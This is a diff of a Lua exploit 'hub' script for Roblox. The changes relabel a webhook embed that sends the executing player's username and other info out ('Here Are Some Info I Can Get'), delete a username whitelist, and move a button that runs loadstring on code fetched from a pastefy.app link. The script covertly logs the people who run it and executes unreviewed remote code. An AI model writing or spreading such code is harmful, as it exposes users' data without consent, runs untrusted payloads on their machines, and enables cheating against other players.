@@ -33,7 +33,7 @@ end
 local Bet = {
     ["embeds"] = {
         {
-            title = "Roblox User Log",
+            title = "Converted Hub Executed, Here Are Some Info I Can Get",
             color = 8388736, -- purple
             fields = {
                 { name = "Username", value = username, inline = true },
@@ -60,38 +60,6 @@ pcall(function()
         h:PostAsync(NNN, h:JSONEncode(Bet))
     end
 end)
-
-
-
--- WL HERE
-
-
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
-local Whitelist = {
-	"07n7z",
-	"00de0l",
-	"lolmy12114"
-}
-
-local function isWhitelisted(name)
-	for _, v in ipairs(Whitelist) do
-		if name == v then
-			return true
-		end
-	end
-	return false
-end
-
-if not isWhitelisted(player.Name) then
-	player:Kick("You are not whitelisted.")
-	return false
-end
-
-return true
-
-
 
 -- HUB HERE
 
@@ -193,14 +161,6 @@ Tab:Button{
 	Description = nil,
 	Callback = function()
     loadstring(game:HttpGet("https://pastefy.app/EeGFCqxO/raw", true))()
-    end
-}
-
-Tab:Button{
-	Name = "barbie car",
-	Description = nil,
-	Callback = function()
-    loadstring(game:HttpGet("https://pastefy.app/WXDkA1gv/raw", true))()
     end
 }
 
@@ -1511,5 +1471,18 @@ PointLight7.Shadows = false
 local Lighting = game:GetService("Lighting")
 
 Lighting.ClockTime = 0
+    end
+}
+
+local Tab = GUI:Tab{
+	Name = "Team Secret's scripts",
+	Icon = "rbxassetid://127827798983413"
+}
+
+Tab:Button{
+	Name = "barbie car",
+	Description = nil,
+	Callback = function()
+    loadstring(game:HttpGet("https://pastefy.app/WXDkA1gv/raw", true))()
     end
 }
